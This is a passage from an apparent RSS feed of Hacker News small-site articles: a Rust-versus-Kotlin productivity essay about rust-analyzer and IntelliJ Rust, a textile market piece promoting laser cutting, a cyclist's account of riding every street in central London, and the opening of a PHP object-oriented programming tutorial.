Nonetheless, as programming languages differ lot, the bulk of logic for analyzing Rust is implemented in the plugin itself.
Presentational features like completion list come from the platform, but most of the language semantics is hand-written.
IntelliJ Rust also includes a bit of a Swing GUI.</p>
<p><a href="https://github.com/rust-analyzer/rust-analyzer"><strong>rust-analyzer</strong></a> is an implementation of
<a href="https://microsoft.github.io/language-server-protocol/">Language Server Protocol</a> for Rust.
It is a Rust compiler front-end written from scratch with an eye towards IDE support.
It makes heavy use of <a href="https://github.com/salsa-rs/salsa">salsa</a> library for incremental computations.
Beyond the compiler itself, rust-analyzer includes code for managing long-lived multithreaded process of the language server itself.</p>
<p>The projects are essentially equivalent in scope — rust compiler front-ends suitable for IDEs.
The two biggest differences are:</p>
<div>
<ul>
<li>
<p>IntelliJ Rust is a plugin, so it can re-use code and design patterns of the surrounding platform.</p>
</li>
<li>
<p>rust-analyzer is the second system, so it leverages experience of IntelliJ Rust for a from-scratch design.</p>
</li>
</ul>
</div>
<p>The internal architecture of the two projects also differs a lot.
In terms of <a href="https://rust-analyzer.github.io/blog/2020/07/20/three-architectures-for-responsive-ide.html">Three Architectures</a>, IntelliJ Rust is map-reduce, and rust-analyzer is query-based.</p>
<p>Writing an IDE-ready compiler is a high-level task.
You don’t need to talk to the operating system directly.
There are some fancy data structures and concurrency here and there, but they are also high-level.
It’s not about implementing crazy lock-free schemes, it’s about maintaining application state and sanity in the multithreaded world.
The bulk of the compiler is symbolic manipulation, arguably best suited for lisp.
Picking a VM-based language for such task (for example, OCaml), doesn’t have any intrinsic downsides.</p>
<p>At the same time, the task is pretty complex and unique.
The ratio of “your code” vs “framework code” when implementing features is much higher than in a typical CRUD backend.</p>
<p>Now that the projects are introduced, lets take two roughly equivalent slices of history.</p>

<p>Both are about 2 years old, with 1-1.5 developers working full time and vibrant and thriving community of open-source contributors.
There are 52k lines of Kotlin and 66k lines of Rust.</p>
<p>Both delivered roughly equivalent feature sets at that time.
To be honest, I still don’t really believe this :)
rust-analyzer started from zero, it didn’t have a decade worth of Java classes to bootstrap from, and the productivity drop between Kotlin and Rust is supposed to be huge.
But it’s hard to argue with reality.
Instead, let me try to reflect on my experience building both, and to try to explain Rust’s surprising productivity.</p>
</div>
</div>
<div>
<h2 id="_learning_curve">Learning Curve</h2>
<div>
<p>It’s easy to characterize Kotlin’s learning curve — it is nearly zero.
I’ve started IntelliJ Rust without Kotlin experience and never felt that I need to specifically learn Kotlin.</p>
<p>When I switched to rust-analyzer, I was pretty experienced with Rust.
I would say that one definitely needs to deliberately learn Rust, it’s hard to pick it up on the go.
Ownership and aliasing control are novel concepts (even if you come from C++), and taking holistic approach to learning them pays off.
After the initial learning step the ride is generally smooth.</p>
<p>By the way, this is the perfect place to plug our Rust courses and tailor-made <a href="https://ferrous-systems.com/training/">trainings</a> :-)
The next <a href="https://ferrous-systems.com/training/#package-intro-training">introduction to Rust</a> is happening this December!</p>
</div>
</div>
<div>
<h2 id="_modularity">Modularity</h2>
<div>
<p>This I think is the biggest factor.
Both projects are moderately large in terms of scope as well as in terms of amount of source code.
I believe that the only way to ship big things is to split them in independent-ish chunks and implement the chunks separately.</p>
<p>I also find most of the languages I am familiar with to be pretty horrible with respect to modularity.
More generally, I am amused with FP vs OO debate, as it seems that “why no one does modules right?” is a more salient issue.</p>
<p>Rust is one of the few languages which has first-class concept of libraries.
Rust code is organized on two levels:</p>
<div>
<ul>
<li>
<p>as a tree of inter-dependent modules inside a crate</p>
</li>
<li>
<p>and as a directed acyclic graph of crates</p>
</li>
</ul>
</div>
<p>Cyclic dependencies are allowed between the modules, but not between the crates.
Crates are units of reuse and privacy: only crate’s public API matters, and it is crystal clear what crate’s public API is.
Moreover, crates are anonymous, so you don’t get name conflicts and dependency hell when mixing several versions of the same crate in a single crate graph.</p>
<p>This makes it very easy to make two pieces of code <strong>not</strong> depend on each other (non-dependencies are the essence of modularity): just put them in separate crates.
During code review, only changes to Cargo.tomls need to be monitored carefully.</p>
<p>At the time of comparison, rust-analyzer is split into 23 internal crates, with a handful general-purposed ones released on crates.io.
In contrast, IntelliJ Rust is a single Kotlin module, where everything can depend on everything else.
Although internal organization of IntelliJ Rust is pretty clean, it’s not reflected in the file system layout and build system, and needs constant maintenance.</p>
</div>
</div>
<div>
<h2 id="_build_system">Build System</h2>
<div>
<p>Managing project’s build takes significant amount of times, and has multiplicative effect on everything else.</p>
<p>Rust’s build system, <a href="https://doc.rust-lang.org/cargo/index.html">Cargo</a>, is very good.
It’s not perfect, but it is a breath of fresh air after Java’s <a href="https://gradle.org/">Gradle</a>.</p>
<p>Cargo’s trick is that it doesn’t try to be a general purpose build system.
It can only build Rust projects, and it has rigid expectation about the project structure.
It’s impossible to opt out of the core assumptions.
Configuration is a static non-extensible TOML file.</p>
<p>In contrast, Gradle allows free-form project structure, and is configured via a Turing complete language.
I feel like I’ve spend more time learning Gradle than learning Rust!
Running <code>wc -w</code> gives 182_817 words for Rust book, and 280_506 for Gradle’s user guide.</p>
<p>Additionally, Cargo is just faster than Gradle in most cases.</p>
<p>Of course, the biggest downside is that custom build logic is not expressible in Cargo.
Both projects needs substantial amount of logic beyond mere compilation to deliver the final result to the user.
For rust-analyzer, this is handled by hand-written Rust script, which works perfectly at this scale.</p>
</div>
</div>
<div>
<h2 id="_ecosystem">Ecosystem</h2>
<div>
<p>Language-level support for libraries and top-notch build system/package manager allow for a thriving ecosystem.
rust-analyzer relies on third-party libraries much more than IntelliJ Rust.
Some parts of rust-analyzer are also published to crates.io for other projects to reuse.</p>
<p>Additionally, low-level nature of the Rust programming language often allows for “perfect” library interfaces.
Interfaces which exactly reflect the underlying problem, without imposing intermediate language-level abstractions.</p>
</div>
</div>
<div>
<h2 id="_basic_conveniences">Basic Conveniences</h2>
<div>
<p>I feel that Rust is significantly more productive when it comes to basic language nuts and bolts — structs, enums, functions, etc.
This is not specific to Rust — any ML-family language has them.
However, Rust is the first industrial language which wraps these features in a nice package, not constrained by backwards compatibility.
I want to list specific features which I think allow producing maintainable code faster in Rust</p>
<p><em>Emphasis on data over behavior</em>.
Aka, Rust is not an OOP language.
The core idea of OOP is that of dynamic dispatch — which code is invoked by a function call is decided at runtime (late binding).
This is a powerful pattern which allows for flexible and extensible system.
The problem is, extensibility is costly!
It’s better only to apply it in certain designated areas.
Designing for extensibility by default is not cost effective.
Rust puts static dispatch front and center: it is mostly clear whats going on by just reading the code, as it is independent of runtime types of the objects.</p>
<p>One small syntactic thing I enjoy about Rust is how it puts fields and methods into different blocks syntactically:</p>
<div>
<div>
<pre><code data-lang="rust"><span>struct</span> <span>Person</span> <span>{</span>
  <span>first_name</span><span>:</span> <span>String</span><span>,</span>
  <span>last_name</span><span>:</span> <span>String</span><span>,</span>
<span>}</span>

<span>impl</span> <span>Person</span> <span>{</span>
    <span>fn</span> <span>full_name</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
        <span>...</span>
    <span>}</span>
<span>}</span></code></pre>
</div>
</div>
<p>Being able to see at a glance all the fields makes understanding the code much simpler.
Fields convey much more information than methods.</p>
<p><em>Sum types</em>.
Rust’s humbly named enums are full algebraic data types.
This means that you can express the idea of disjoint union:</p>
<div>
<div>
<pre><code data-lang="rust"><span>enum</span> <span>Either</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>{</span> <span>A</span><span>(</span><span>A</span><span>),</span> <span>B</span><span>(</span><span>B</span><span>)</span> <span>}</span></code></pre>
</div>
</div>
<p>This is hugely useful in day-to-day programming in the small, and some times during programming in the large as well.
To give one example, one of the core concepts for an IDE are references and definitions.
A definition a like <code>let foo = 92;</code> assigns a name to an entity which can be used down a line.
A reference like <code>foo + 90</code> <em>refers</em> to some definition.
When you ctrl-click on reference, you go to the definition.</p>
<p>Natural way to model that in Kotlin is by adding <code>interface Definition</code> and <code>interface Reference</code>.
The problem is, some things are …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/">https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/</a></em></p>]]>
            </description>
            <link>https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939875</guid>
            <pubDate>Fri, 30 Oct 2020 07:10:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Brief market analysis of technical textiles]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24939568">thread link</a>) | @Mimowork
<br/>
October 29, 2020 | https://www.mimowork.com/news/brief-market-analysis-of-technical-textiles.html | <a href="https://web.archive.org/web/*/https://www.mimowork.com/news/brief-market-analysis-of-technical-textiles.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Textiles have always played an important role in different occasions and different applications. From simple protection from the cold to now used in <strong>home decoration, industrial filtration, building, insulation, and other industries</strong>, textiles begin to provide more functions beyond their own value. The research on textile materials and processing technology has given technical textiles more functions to meet the different needs of users.</p><p>According to data statistics, the market value of technical textiles in 2019 reached $201.2 billion and is estimated to grow rapidly at a compound annual growth rate of 5.1% in the following seven years. Such a huge market size and rapid growth rate indicate the development potential of the technical textile market, and also witness that consumer demand is changing. <strong>Antibacterial, anti-mildew, flame retardant, insulation, waterproof and other functions</strong> have been added to ordinary textiles. Textile manufacturers have gradually optimized their development strategies and changed their development directions to occupy a place in the textile market under the favorable conditions that technical textiles are popular and have broad prospects.</p><p><img src="https://www.mimowork.com/data/upload/ueditor/20201020/5f8e5a90c61ff.jpg" title="Brief market analysis of technical textiles" alt="Brief market analysis of technical textiles"></p><p><strong>Which industries will steer the development of technical textiles in the future?</strong></p><p>The current public's attention to <strong>health care</strong> has greatly promoted the development of medical protective clothing. <a href="https://www.youtube.com/watch?v=KV1dN1wm-NI" target="_self" title="Laser Cutting Face Mask"><strong>Face masks</strong></a> and protective clothing are not only adopted in the medical field but also widely used in daily life. Non-woven fabrics have become the preferred material for protective products due to their lightweight, breathability, good protective effect, durability, and environmental protection. The non-woven market is anticipated to develop rapidly in the next 7 years with a growth rate of 5.7%. This is why most textile manufacturers invest more funds in protective products.</p><p><img src="https://www.mimowork.com/data/upload/ueditor/20201020/5f8e590379712.png" title="Brief market analysis of technical textiles" alt="Brief market analysis of technical textiles"></p><p>Resource from: alliedmarketresearch</p><p>In addition to the medical field, end users in the <strong>construction, filtration, packaging, and automotive industries</strong> are considered to have a major driving force for the development of future technical textiles. The prosperous development of these industries and the rapid rise of the vast emerging economies have provided a gradual expansion market for technical textiles.</p><p><strong>Challenges faced and exploration of solutions</strong></p><p>The technological advancement and material innovation of technical textiles have also injected a boost for manufacturers in this market despite the temporary disruption of the supply chain. However, facing the rapid development of the technical textile market and the emergence of more and more competitors, how to improve market competitiveness has become an urgent problem for technical textile manufacturers to think about. Moreover, the public's attention to ecological issues has made environmentally friendly textile materials widely concerned. Based on this background, the control of raw material costs and the disposal of toxic wastes require technical textile manufacturers to find effective ways and strategies to solve them.</p><p><img src="https://www.mimowork.com/data/upload/ueditor/20201020/5f8e5a648a151.jpg" title="Brief market analysis of technical textiles" alt="Brief market analysis of technical textiles"><img src="https://www.mimowork.com/data/upload/ueditor/20201020/5f8e5a822a648.jpg" title="Brief market analysis of technical textiles" alt="Brief market analysis of technical textiles"></p><p>On the one hand, integration with the fashion industry may be a way for technical textile manufacturers to increase the added value of textiles. <a href="https://www.mimowork.com/digital-printing/" target="_self" title="Digital Printing Textiles"><strong>Digital printing</strong></a>, <a href="https://www.mimowork.com/sublimation-apparel/laser-cutting-sublimation-apparel.html" target="_self" title="Laser Cutting Sublimation Apparel"><strong>sublimation printing</strong></a>, and other technologies have been widely used in the field of apparel and home textiles, especially <strong>sportswear</strong>. Sportswear with multiple functions such as waterproof, quick-drying, and odor-resistant, with the support of sublimation printing technology, is suitable for outdoor or indoor sportsmen while providing safety guarantees, it also optimizes the wearing experience. On the other hand, technical textile manufacturers oriented to the industrial processing sector also need to seize opportunities, seek for high-quality partners, and innovate processing technologies to maintain market competitiveness.</p><p><strong>Application and advantages of laser cutting technical textiles</strong></p><p>Whether it is <strong>home textiles, clothing, or industrial fabrics</strong>, technical textiles are the long-term development direction of these fields in the future. <strong>Laser cutting technology</strong> is creating growing revenue for these technical textile manufacturers. Owing to its high-precision cutting, timely edge banding, and high-degree of automation,&nbsp;<a href="https://www.mimowork.com/athletic-apparel-and-technical-clothing/laser-cutting-athletic-apparel-and-technical-clothing.html" target="_self" title="Laser Cutting Athletic Apparel and Technical Clothing"><strong>laser cutting technical textiles</strong></a>&nbsp;has become an investment direction for more and more manufacturers.&nbsp;</p><p><a href="https://www.mimowork.com/flatbed-laser-cutting-machine/flatbed-laser-cutter-160.html" target="_self" title="FLATBED LASER CUTTER 160"><img src="https://www.mimowork.com/data/upload/ueditor/20201020/5f8e5a9ea3adf.jpg" title="Brief market analysis of technical textiles" alt="Brief market analysis of technical textiles"></a></p><p>It has always been <a href="https://www.mimowork.com/about-us/" target="_self" title="Laser Cutter Manufacturer"><strong>Mimowork</strong></a>'s business philosophy to design customized and suitable laser processing solutions for customers to solve their worries. We are always available to help you if you are interested in laser cutting or want to consult laser-related issues. Please feel free to contact us!</p><p><a href="https://www.mimowork.com/" target="_self" title="Laser Cutting Machine Manufacturer"><strong>https://mimowork.com/</strong></a></p></div></div>]]>
            </description>
            <link>https://www.mimowork.com/news/brief-market-analysis-of-technical-textiles.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939568</guid>
            <pubDate>Fri, 30 Oct 2020 05:56:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cycling through all the streets in central London]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24939328">thread link</a>) | @quickthrower2
<br/>
October 29, 2020 | http://davis.vilums.me/all-the-streets/ | <a href="https://web.archive.org/web/*/http://davis.vilums.me/all-the-streets/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="themify_builder_content-660" data-postid="660">
    	<!-- module_row -->
	<div data-fullwidthvideo="https://www.youtube.com/watch?v=0nA_H-57i-w">
	    	    <div>
			<div>
	    	    	        <div>
		    <!-- module text -->
<div>
            <p>
    <h3>Cycling through</h3>

<h3>in central London</h3>    </p>
</div>
<!-- /module text -->
	        </div>
	    	</div>
		    </div>
	    <!-- /row_inner -->
	</div>
	<!-- /module_row -->
		<!-- module_row -->
	<div>
	    	    <div data-basecol="2" data-col_tablet="column-full">
			<div>
	    	    	        <div>
		    <!-- module text -->
<div>
            <p>
    <h2>Why?</h2>
<h3>I am a passionate cyclist, and I love the streets of London. Most of my travels are daily 25-minute rides to work. Over time my route became boring. I decided to make it a little bit more interesting by taking the parallel streets on my way there. I bought a map of central London and started to colour in the streets to mark the routes that I have taken. And then I got obsessed with it.</h3>    </p>
</div>
<!-- /module text -->
	        </div>
	    	</div>
		<div>
	    	    	        <div>
		        <!-- module image -->
    <div>
	                <p><img src="http://davis.vilums.me/wp-content/uploads/2019/10/ezgif.com-optimize-6.gif" alt="ezgif.com-optimize (6)" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">            
                        </p>
            <!-- /image-wrap -->
        
        
        </div>
    <!-- /module image -->
	        </div>
	    	</div>
		    </div>
	    <!-- /row_inner -->
	</div>
	<!-- /module_row -->
		<!-- module_row -->
	<div>
	    	    <div>
			<div>
	    	    	        <div>
		    	<div>
	    	    <div data-tablet_dir="rtl" data-mobile_dir="rtl" data-basecol="2" data-col_tablet="column-full" data-col_tablet_landscape="column4-2" data-col_mobile="column-full">
			<div> 
	    	    	        <div>
		        <!-- module image -->
    <div>
	                <p><a href="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674.jpg">
                                           <img src="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674.jpg" alt="Both of the maps that I mainly used" srcset="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674.jpg 4032w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674-300x225.jpg 300w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674-1024x768.jpg 1024w" sizes="(max-width: 4032px) 100vw, 4032px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674.jpg" data-lazy-srcset="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674.jpg 4032w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674-300x225.jpg 300w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674-1024x768.jpg 1024w">                </a>
            
                        </p>
            <!-- /image-wrap -->
        
        
        </div>
    <!-- /module image -->
	        </div>
	    	</div>
		<div> 
	    	    	        <div>
		    <!-- module text -->
<div>
            <div>
    <h2>How did I do it?</h2>
<p>In the beginning, I used the “<a href="https://www.az.co.uk/london-a-z-map-walks.html">London A-Z Map &amp; Walks</a>” map. It covered a significant amount of central London, but it wasn’t enough, and the shape was not regular. So I found the “<a href="https://www.az.co.uk/london-super-scale-a-z-map.html">London Super Scale A-Z Map</a>” that was rectangular and covered a larger area. An essential thing for the map of my choice was that streets are laid out very accurately. Including some irregular times off, overall it took me four years to visit every single road on the map. When I started this hobby, it took me 30 to 40 minutes to do the route. Later it expanded to 2 hours to get to the office when I tried to reach the furthest places on my map. One of the main goals was never to be late for work. From the beginning, I planned to visit not only the main roads but every single accessible mews, yard, park trail, and a path that was possible to go through. I used Endomondo app to have a proper record of my journeys and proof that I have been there. After every trip, I prepared my next route in Google maps where it was easy to adjust streets to the next ones and mark points to revisit if I missed something.</p>    </div>
</div>
<!-- /module text -->
	        </div>
	    	</div>
		    </div>
	</div><!-- /themify_builder_sub_row -->
		<div>
	    	    <div data-tablet_landscape_dir="rtl" data-basecol="2" data-col_tablet="column-full" data-col_tablet_landscape="column4-2">
			<div> 
	    	    	        <div>
		    <!-- module text -->
<div>
            <div>
    <h2>How was it?&nbsp;</h2>
<p>The most satisfying feeling I got when I found a shortcut in some of my trails. It was like finding some portal that links two separated parts on the map. There were some obstacles, like road closures or construction works, that sometimes prevented me from accessing the streets. I marked all of those streets as necessary to visit later when the street was accessible again (like London bridge station surroundings and few streets around Barbican etc.). Occasionally I found my route trough yards and gardens that are not visited by passersby very often. If anyone asked how did I get there, I had to pretend to be lost. I take traffic and rules very seriously, so I always have to be aware of the surroundings in unfamiliar places. If it is not allowed to cycle through the park, I always push my bicycle instead.</p>    </div>
</div>
<!-- /module text -->
    <!-- module image -->
    <div>
	                <p><a href="http://davis.vilums.me/wp-content/uploads/2019/10/a-1.jpg">
                                           <img src="http://davis.vilums.me/wp-content/uploads/2019/10/a-1-470x352.jpg" width="470" alt="Fully coloured &quot;London Super Scale A-Z Map&quot;" srcset="http://davis.vilums.me/wp-content/uploads/2019/10/a-1-470x352.jpg 470w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1-300x225.jpg 300w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1-1024x768.jpg 1024w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1-450x337.jpg 450w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1.jpg 2000w" sizes="(max-width: 470px) 100vw, 470px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://davis.vilums.me/wp-content/uploads/2019/10/a-1-470x352.jpg" data-lazy-srcset="http://davis.vilums.me/wp-content/uploads/2019/10/a-1-470x352.jpg 470w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1-300x225.jpg 300w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1-1024x768.jpg 1024w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1-450x337.jpg 450w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1.jpg 2000w">                </a>
            
                        </p>
            <!-- /image-wrap -->
        
        
        </div>
    <!-- /module image -->
	        </div>
	    	</div>
		<div> 
	    	    	        <div>
		        <!-- module image -->
    <div>
	                <p><a href="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430.jpg">
                                           <img src="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430.jpg" alt="" srcset="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430.jpg 2736w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430-225x300.jpg 225w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430-768x1024.jpg 768w" sizes="(max-width: 2736px) 100vw, 2736px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430.jpg" data-lazy-srcset="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430.jpg 2736w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430-225x300.jpg 225w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430-768x1024.jpg 768w">                </a>
            
                        </p>
            <!-- /image-wrap -->
        
        
        </div>
    <!-- /module image -->
	        </div>
	    	</div>
		    </div>
	</div><!-- /themify_builder_sub_row -->
		        </div>
	    	</div>
		    </div>
	    <!-- /row_inner -->
	</div>
	<!-- /module_row -->
		<!-- module_row -->
	
	<!-- /module_row -->
		<!-- module_row -->
	<div>
	    	    <div data-basecol="3" data-col_tablet="column-full" data-col_mobile="column-full">
			
		<div>
	    	    	        <div>
		    <!-- module text -->
<div>
            <div>
    <h2>Wrapping it up all together</h2>
<p>I exported all my tracks from the Endomondo app and put together in a single video. Now we can see how I gradually covered all the visible space on the map, and the result was very pleasing. It resulted in thunderstorm type of effect where each path looks like a lightning flash, that reveals London’s street grid.</p>

<p><a href="http://davis.vilums.me/wp-content/uploads/2019/10/PicturesCompressed.mp4">Longer linear time version</a></p>
    </div>
</div>
<!-- /module text -->
	        </div>
	    	</div>
		
		    </div>
	    <!-- /row_inner -->
	</div>
	<!-- /module_row -->
		<!-- module_row -->
	<div>
	    	    <div data-basecol="3" data-col_tablet="column-full" data-col_mobile="column-full">
			
		<div>
	    	    	        <div>
		    <!-- module text -->
<div>
            <div>
    <h2>Conclusion&nbsp;</h2>
<p>That was an enjoyable waste of time, and I liked every bit of it, planning, executing and then colouring in the streets and paths where my route took place. I found it a great way how to discover new areas in London and familiarise all the boroughs of central London. This journey for me made every corner of central London feel like home.</p>    </div>
</div>
<!-- /module text -->
    <!-- module image -->
    <div>
	                <p><img src="http://davis.vilums.me/wp-content/uploads/2019/10/IMG_20191027_160926-1-1.jpg" alt="IMG_20191027_160926 (1) (1)" srcset="http://davis.vilums.me/wp-content/uploads/2019/10/IMG_20191027_160926-1-1.jpg 1000w, http://davis.vilums.me/wp-content/uploads/2019/10/IMG_20191027_160926-1-1-300x283.jpg 300w" sizes="(max-width: 1000px) 100vw, 1000px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://davis.vilums.me/wp-content/uploads/2019/10/IMG_20191027_160926-1-1.jpg" data-lazy-srcset="http://davis.vilums.me/wp-content/uploads/2019/10/IMG_20191027_160926-1-1.jpg 1000w, http://davis.vilums.me/wp-content/uploads/2019/10/IMG_20191027_160926-1-1-300x283.jpg 300w">            
                        </p>
            <!-- /image-wrap -->
        
        
        </div>
    <!-- /module image -->
<!-- module text -->
<div>
            <div>
    <p>cycling@vilums.me&nbsp;</p>
<p><a href="https://www.youtube.com/watch?v=BWpnqRTDIWQ&amp;list=PLd0jT172k7naa8ALKDXwyu6uiNN3Dc8ZN">YouTube</a></p>
<p><a href="https://www.instagram.com/davisvilums/">Instagram</a></p>
<p><a href="http://davis.vilums.me/visas-ielas/">Latviski</a></p>
<p>&nbsp;<a href="https://londonist.com/london/transport/cycle-every-street-central-london">Londonist Article</a></p>
<p><a href="https://www.reci.pe/">Recipe</a></p>
<p><a href="https://www.givingforlatvia.com/">Giving for Latvia</a></p>

<h5>If you like what I’m doing, please, help me get a new bike?</h5>
    </div>
</div>
<!-- /module text -->
	        </div>
	    	</div>
		
		    </div>
	    <!-- /row_inner -->
	</div>
	<!-- /module_row -->
	</div></div>]]>
            </description>
            <link>http://davis.vilums.me/all-the-streets/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939328</guid>
            <pubDate>Fri, 30 Oct 2020 05:01:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Object Oriented Done Right]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24939258">thread link</a>) | @brendt_gd
<br/>
October 29, 2020 | https://front-line-php.com/object-oriented | <a href="https://web.archive.org/web/*/https://front-line-php.com/object-oriented">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
            
<div>
    <p>Alan Kay, the inventor of the term “object-oriented programming”, told a story once during a talk more than 20 years ago. You can build a dog house using only a hammer, nails, planks, and just a little bit of skill. I figure even I would be able to build it given enough time. Once you've built it you've earned the skills and know-how, and could apply it to other projects. Next, you want to build a cathedral, using the same approach with your hammer, nails, and planks. It's a 100 times larger, but you've done this before — right? It'll only take a little longer.</p>

    <p>While the scale went up by a factor of 100, its mass went up by a factor of 1.000.000 and its strength only by 10.000. Inevitably, the building will collapse. Some people plaster over the rubble, make it into a pyramid and say it was the plan all along; but you and I know what really went on.</p>

    <p>Alan used this metaphor to explain a critical problem he saw with “modern OOP” 20 years ago. I think it still holds today: we've taken the solution to a problem — OO code — we've scaled it by a factor of 100, and expected it to work the same way. Today still, we don't think enough about architecture — which is rather crucial if you're building a cathedral — we use the OO solutions we learned without any extra thought. Most of us learned OO in isolation with small examples, and rarely at scale. In most real life projects, you cannot simply apply the patterns you've learned and expect everything to fall into place the same way it did with Animals, Cats, and Dogs.</p>
    <p>This reckless scaling of OO code is what cause many people to voice their disapproval of it in recent years. Personally I believe OOP is as good a tool as any other — functional programming being the modern-day popular contestant — <em>if</em> used correctly.</p>
    <p>My takeaway from Alan's vision is that each object is a little program on its own, with its own internal state. Objects send messages between each other — packages of immutable data — which other objects can interpret and react to. You can't write all code this way, and that's fine — it's fine to not blindly follow these rules.
        Still, I have experienced the positive impact of this mindset first hand. Thinking of objects as little standalone programs, I started writing parts of my code in a different style. I hope that, now that we're going to look at OOP, you'll keep Alan's ideas in mind. Don't blindly apply patterns and principles. Try to look at what you're building as a whole.</p>
    <h2 id="the-pitfall-of-inheritance"><a href="#the-pitfall-of-inheritance">#</a> The pitfall of inheritance</h2>
    <p>I found it difficult to believe at first, but classes and inheritance have nothing to do with OOP the way Alan envisioned it. That doesn't mean they are bad things per se, but it <em>is</em> good to think about their purpose and how we can use, as well as abuse them.
        Alan's vision only described objects — it didn't describe how those objects were created. Classes were added later as a convenient way to manage objects, but they are only an implementation detail, not the core idea of OOP. With classes came inheritance, another a useful tool when used correctly. That hasn't been the case though: the problem Alan tried to address 20 years ago still exists today.</p>
    <p>One of the acclaimed strengths of OOP is that it models our code in ways humans think about the world. In reality though, we rarely think in terms of abstractions and inheritance. Instead of using inheritance in places where it actually makes sense, we've been abusing it as a way to share code, and to configure objects in an obscure way.
        I'm going to show you a great example that illustrates this problem, though I want to say up front that it isn't my own: it's Sandi Metz's, a great teacher on the subject of OOP. Let's take a look.</p>
    <p>There's a children's nursery rhyme called “The House That Jack Built” (it's also a horror movie but that's unrelated).
        It starts like this:</p>
    <pre><code>This is the house that Jack built.</code></pre>
    <p>Every iteration there's a sentence added to it:</p>
    <pre><code>This is the malt that lay in
        the house that Jack built.</code></pre>
    <p>And next:</p>
    <pre><code>This is the rat that ate
        the malt that lay in
        the house that Jack built.</code></pre>
    <p>Get it? This is the final poem:</p>
    <pre><code>This is the horse and the hound and the horn that belonged to
        the farmer sowing his corn that kept
        the rooster that crowed in the morn that woke
        the priest all shaven and shorn that married
        the man all tattered and torn that kissed
        the maiden all forlorn that milked
        the cow with the crumpled horn that tossed
        the dog that worried
        the cat that killed
        the rat that ate
        the malt that lay in
        the house that Jack built.</code></pre>
    <p>Let's code this together, I'll be using PHP. We're going to make a program that you can ask a given iteration, and it will produce the poem up until that point. Let's do it in an OO way. We start by adding all parts into a data array within a class; let's call that class <code><span>PoemGenerator</span></code> — sounds very OO, right? Good.</p>
    <pre><code><span><span>class</span> <span>PoemGenerator</span>
</span>{
    <span>private</span> <span>static</span> <span>array</span> <span>$data</span> = [
        <span>'the horse and the hound and the horn that belonged to'</span>,
        <span>'the farmer sowing his corn that kept'</span>,
        <span>'the rooster that crowed in the morn that woke'</span>,
        <span>'the priest all shaven and shorn that married'</span>,
        <span>'the man all tattered and torn that kissed'</span>,
        <span>'the maiden all forlorn that milked'</span>,
        <span>'the cow with the crumpled horn that tossed'</span>,
        <span>'the dog that worried'</span>,
        <span>'the cat that killed'</span>,
        <span>'the rat that ate'</span>,
        <span>'the malt that lay in'</span>,
        <span>'the house that Jack built'</span>,
    ];
}</code></pre>
    <p>Now let's add two methods <code><span>generate</span></code> and <code><span>phrase</span></code>. <code><span>generate</span></code> will return the end result, and <code><span>phrase</span></code> is an internal function that glues the parts together.</p>
    <pre><code><span><span>class</span> <span>PoemGenerator</span>
</span>{
    

    <span>public</span> <span><span>function</span> <span>generate</span><span>(<span>int</span> $number)</span>: <span>string</span>
    </span>{
